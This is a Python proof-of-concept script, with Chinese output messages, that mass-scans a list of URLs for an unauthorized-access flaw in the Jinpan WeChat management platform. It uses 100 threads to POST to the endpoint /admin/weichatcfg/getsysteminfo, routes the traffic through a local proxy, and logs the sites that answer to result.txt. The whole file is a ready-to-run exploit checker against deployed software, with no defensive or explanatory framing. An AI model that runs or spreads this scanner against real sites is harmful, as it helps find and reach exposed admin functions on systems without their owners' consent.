import argparse,requests,sys,json
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def banner():
    test = """金盘微信管理平台"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="金盘微信管理未授权")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = "/admin/weichatcfg/getsysteminfo"
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080",
    }
    res = requests.get(url=target)
    try:
        if res.status_code == 200:
            res1 = requests.post(url=target + payload,verify=False, timeout=5, proxies=proxies)
            if res1.status_code == 200:
                res2 = json.loads(res1.text)
                if res2.get('message') == "导入成功！":
                    print(f"[+] {target} 存在未授权漏洞")
                    with open('result.txt', 'a', encoding='utf-8') as f:
                        f.write(f"[+] {target} 存在未授权漏洞\n")
                else:
                    print(f"该 {target} 不存在未授权漏洞")
            else:
                print(f"请求失败")
        else:
            print()
    except Exception as e:
        print(e)


if __name__ == '__main__':
    main()